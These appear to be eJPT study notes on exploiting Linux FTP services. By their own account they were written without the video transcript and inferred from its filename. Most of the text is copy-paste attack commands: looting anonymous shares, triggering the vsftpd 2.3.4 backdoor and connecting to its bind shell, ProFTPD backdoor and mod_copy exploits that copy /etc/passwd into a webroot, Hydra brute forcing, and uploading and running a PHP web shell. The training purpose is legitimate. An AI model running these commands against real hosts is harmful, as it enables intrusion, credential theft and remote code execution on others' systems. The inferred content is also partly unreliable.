# Exploiting FTP (eJPT) — Summary Notes

Note: The transcript for “04 - Exploiting FTP.mp4” was not provided. The following is a careful, conservative summary inferred from the filename and typical eJPT content for Linux exploitation of FTP services (vsftpd/ProFTPD), anonymous access, brute force, and Metasploit modules.

## What the video covers (Introduction / big picture)
- How to enumerate and exploit FTP services on Linux targets.
- Identifying common misconfigurations (anonymous access, writable directories).
- Recognizing and exploiting known vulnerable versions (vsftpd 2.3.4 backdoor; ProFTPD 1.3.3c backdoor; ProFTPD mod_copy).
- Leveraging FTP to gain initial footholds (e.g., download loot, drop a web shell into web roots if permissions allow).
- Using Nmap NSE, CLI FTP, Hydra, and Metasploit to move from discovery to exploitation.

## Flow (ordered)
1. Discover FTP (TCP/21) and grab the banner/version.
2. Run targeted NSE scripts (anon login, backdoors, bounce).
3. Try anonymous login and loot/mirror files.
4. Check for write access; attempt file upload.
5. Check service version for known vulns (vsftpd 2.3.4 / ProFTPD 1.3.3c/1.3.5).
6. Exploit:
   - vsftpd 2.3.4 backdoor (bind shell on 6200).
   - ProFTPD 1.3.3c backdoor (Metasploit).
   - ProFTPD mod_copy → write files into webroot (Metasploit).
7. If no quick win, brute force credentials (Hydra).
8. Use valid creds to pivot (e.g., upload PHP web shell if webroot is writable, or harvest sensitive files).
9. Post-exploitation: enumerate further, escalate privileges.

## Tools highlighted
- Nmap (service detection + NSE: ftp-anon, ftp-syst, ftp-bounce, ftp-vsftpd-backdoor, ftp-proftpd-backdoor)
- netcat (nc) / telnet (manual banner/probing)
- ftp/lftp, curl, wget (interactive and scripted FTP ops)
- Hydra (credential brute force)
- Metasploit Framework (vsftpd_234_backdoor, proftpd_133c_backdoor, proftpd_modcopy_exec)
- searchsploit (verify public exploits)

## Typical command walkthrough (detailed, copy-paste friendly)

- Replace <IP> with target IP. Create a scans/ directory to store outputs.

1) Initial enumeration and versioning
```
mkdir -p scans
nmap -p21 -sV -sC -Pn -oN scans/ftp_init.txt <IP>
nmap -p21 -Pn --script=ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -sV -oN scans/ftp_nse.txt <IP>
```

2) Quick banner grab
```
printf "QUIT\r\n" | nc -nv <IP> 21
```

3) Anonymous login test and basic listing
- Interactive:
```
ftp <IP>
# Name: anonymous
# Password: anonymous@
# Then: ls -la, pwd, cd, get/mget/mput, bye
```
- Non-interactive listing with curl:
```
curl -s --list-only ftp://anonymous:anonymous@<IP>/
```
- Recursive mirror with wget:
```
mkdir -p loot/ftp
wget -r -np -nH -P loot/ftp ftp://anonymous:anonymous@<IP>/
```

4) Test upload (if you have creds or anonymous write)
```
echo "test" > test.txt
# If anonymous write is allowed (rare), or replace user:pass with found creds:
curl -T test.txt ftp://anonymous:anonymous@<IP>/
```

5) vsftpd 2.3.4 backdoor (if service banner/version indicates vsftpd 2.3.4)
- Metasploit:
```
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
run
```
- Manual (triggers a bind shell on port 6200):
```
# Trigger:
printf "USER user:)\r\nPASS pass\r\n" | nc -nv <IP> 21
# Connect to bind shell:
nc -nv <IP> 6200
# Then run: id; uname -a; whoami
```

6) ProFTPD 1.3.3c backdoor (if version shows 1.3.3c)
- Metasploit (recommended; reliable):
```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <IP>
run
```

7) ProFTPD mod_copy (often 1.3.5 era; SITE CPFR/CPTO)
- Check if SITE CPFR/CPTO available (may require login):
```
printf "USER anonymous\r\nPASS anonymous@\r\nSITE HELP\r\nQUIT\r\n" | nc -nv <IP> 21
```
- If mod_copy present, test arbitrary file copy (example: copy /etc/passwd into webroot):
```
# Adjust webroot path as needed (/var/www/html or /var/www):
printf "USER anonymous\r\nPASS anonymous@\r\nSITE CPFR /etc/passwd\r\nSITE CPTO /var/www/html/passwd.txt\r\nQUIT\r\n" | nc -nv <IP> 21
```
- If a web server runs on the host, browse:
```
curl -s http://<IP>/passwd.txt | head
```
- Metasploit for RCE via mod_copy (drops a web-executable file):
```
msfconsole -q
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <IP>
# Adjust TARGETURI to webroot URL path (e.g., /), and WritableDir if needed
show options
run
```

8) Brute force credentials (when allowed)
```
# Common userlists: users.txt; passwords: rockyou.txt or curated
hydra -L users.txt -P passwords.txt -f -V -I -t 4 ftp://<IP>
```

9) Using valid credentials to drop a simple PHP web shell (if FTP user can write to webroot)
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload to suspected webroot via FTP (replace creds/path):
curl -T shell.php ftp://user:pass@<IP>/var/www/html/
# Execute commands via HTTP:
curl -s "http://<IP>/shell.php?cmd=id"
```

10) Looting sensitive files via FTP
- Common FTP roots: /srv/ftp, /var/ftp, ~ftp
- Typical loot: backups, configs, SSH keys, database creds.
```
# Mirror everything when permitted:
lftp -u anonymous,anonymous <IP> -e "set ssl:verify-certificate no; mirror -e --parallel=4; bye"
```

11) Cross-check public exploits
```
searchsploit vsftpd 2.3.4
searchsploit proftpd 1.3.3c
searchsploit proftpd mod_copy
```

## Practical tips
- Passive mode: If listings/transfers hang, toggle passive mode in FTP client (passive) or configure firewall/NAT.
- File permissions: Anonymous FTP “incoming” directories may allow STOR (upload) but not LIST/RETR. You can still upload a test file and then try to access it via another service (e.g., web).
- Version spoofing: Services can lie about versions. Use NSE/backdoor checks; try the exploit cautiously in labs.
- Webroot guesses: Common paths: /var/www/html, /var/www, /usr/share/nginx/html. Confirm with HTTP enumeration first.
- NSE script choices: Start with ftp-anon and ftp-syst. Add ftp-vsftpd-backdoor and ftp-proftpd-backdoor when versions hint at those servers.
- Credential reuse: If you find creds via FTP, try SSH re-use.
- Respect scope: Only brute force or attempt exploits where explicitly authorized.

## Minimal cheat sheet (one-screen flow)
```
# 1) Discover + enumerate
nmap -p21 -sV -sC -Pn <IP>
nmap -p21 -Pn --script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -sV <IP>

# 2) Anonymous?
curl -s --list-only ftp://anonymous:anonymous@<IP>/
wget -r -np -nH -P loot/ftp ftp://anonymous:anonymous@<IP>/

# 3) Writable?
echo test > test.txt
curl -T test.txt ftp://anonymous:anonymous@<IP>/

# 4) vsftpd 2.3.4
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <IP>; run"
# or manual:
printf "USER u:)\r\nPASS p\r\n" | nc -nv <IP> 21; nc -nv <IP> 6200

# 5) ProFTPD 1.3.3c
msfconsole -q -x "use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS <IP>; run"

# 6) ProFTPD mod_copy check/use
printf "USER anonymous\r\nPASS anonymous@\r\nSITE HELP\r\nQUIT\r\n" | nc -nv <IP> 21
printf "USER anonymous\r\nPASS anonymous@\r\nSITE CPFR /etc/passwd\r\nSITE CPTO /var/www/html/passwd.txt\r\nQUIT\r\n" | nc -nv <IP> 21

# 7) Brute force (authorized only)
hydra -L users.txt -P passwords.txt -f -V -I -t 4 ftp://<IP>
```

## Summary
- Enumerate FTP thoroughly with Nmap and NSE; confirm service/version and check for anonymous access and known backdoors.
- Quick wins: anonymous read/write; vsftpd 2.3.4 backdoor; ProFTPD 1.3.3c backdoor; ProFTPD mod_copy file placement.
- Use Metasploit modules for reliable exploitation in labs; fall back to manual techniques where applicable.
- If no direct vuln, try credential attacks (authorized) and then leverage FTP access to drop web shells or exfiltrate valuable data.
- Always verify paths and permissions, and pivot to other services (HTTP/SSH) as you gain access.